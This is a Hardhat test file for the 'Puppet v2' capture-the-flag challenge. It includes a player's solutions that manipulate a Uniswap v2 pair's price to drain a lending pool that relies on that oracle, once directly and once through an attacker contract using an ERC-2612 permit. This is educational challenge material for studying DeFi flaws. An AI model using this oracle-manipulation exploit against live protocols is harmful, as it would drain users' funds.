const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { signERC2612Permit } = require("eth-permit");

describe("[Challenge] Puppet v2", function () {
  let deployer, player;
  let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
  const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

  const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  beforeEach(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(
      PLAYER_INITIAL_ETH_BALANCE
    );

    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.bytecode,
      deployer
    );
    const UniswapRouterFactory = new ethers.ContractFactory(
      routerJson.abi,
      routerJson.bytecode,
      deployer
    );
    const UniswapPairFactory = new ethers.ContractFactory(
      pairJson.abi,
      pairJson.bytecode,
      deployer
    );

    // Deploy tokens to be traded
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    weth = await (await ethers.getContractFactory("WETH", deployer)).deploy();

    // Deploy Uniswap Factory and Router
    uniswapFactory = await UniswapFactoryFactory.deploy(
      ethers.constants.AddressZero
    );
    uniswapRouter = await UniswapRouterFactory.deploy(
      uniswapFactory.address,
      weth.address
    );

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapRouter.addLiquidityETH(
      token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    );
    uniswapExchange = await UniswapPairFactory.attach(
      await uniswapFactory.getPair(token.address, weth.address)
    );
    expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetV2Pool", deployer)
    ).deploy(
      weth.address,
      token.address,
      uniswapExchange.address,
      uniswapFactory.address
    );

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

    // Check pool's been correctly setup
    expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(
      3n * 10n ** 17n
    );
    expect(
      await lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.eq(300000n * 10n ** 18n);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    // UniswapV2Router.sol: https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol
    // 1. Swap all player's DVTs for as much ETH as possible
    // NB: this action increases player's ETH balance with 9.9 ETH and leaves the pair pool with:
    // 10100.000000000000000000 DVT
    // 0.099304865938430984 WETH
    await token
      .connect(player)
      .approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await uniswapRouter.connect(player).swapExactTokensForETH(
      PLAYER_INITIAL_TOKEN_BALANCE,
      0, // NB: this can be more accurate calculating `getAmountOut()`
      [token.address, weth.address],
      player.address,
      ethers.constants.MaxUint256
    );
    // 2. Calculate how much WETH is required as collateral to borrow all pool's DVT balance
    // NB: collateral amount is 29.496494833197321980 WETH, which is now affordable by player
    const wethAmount = await lendingPool.calculateDepositOfWETHRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    // 3. Get the required WETH by wrapping the ETH via the WETH contract
    await weth.connect(player).deposit({ value: wethAmount });
    // 4. Borrow all pool's DVT balance
    await weth.connect(player).approve(lendingPool.address, wethAmount);
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
  });

  it("Execution (using <PuppetV2PoolAttacker>)", async function () {
    /** CODE YOUR SOLUTION HERE */
    // UniswapV2Router.sol: https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol
    nonce = await ethers.provider.getTransactionCount(player.address);
    const attackerAddr = ethers.utils.getContractAddress({
      from: player.address,
      nonce,
    });
    const { r, s, v } = await signERC2612Permit(
      player,
      token.address,
      player.address,
      attackerAddr,
      ethers.constants.MaxUint256
    );
    await (
      await ethers.getContractFactory("PuppetV2PoolAttacker", player)
    ).deploy(
      lendingPool.address,
      uniswapRouter.address,
      weth.address,
      token.address,
      v,
      r,
      s,
      { value: 196n * 10n ** 17n } // NB: 19.6 ETH is enough to cover the attack
    );
  });

  afterEach(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0);

    expect(await token.balanceOf(player.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
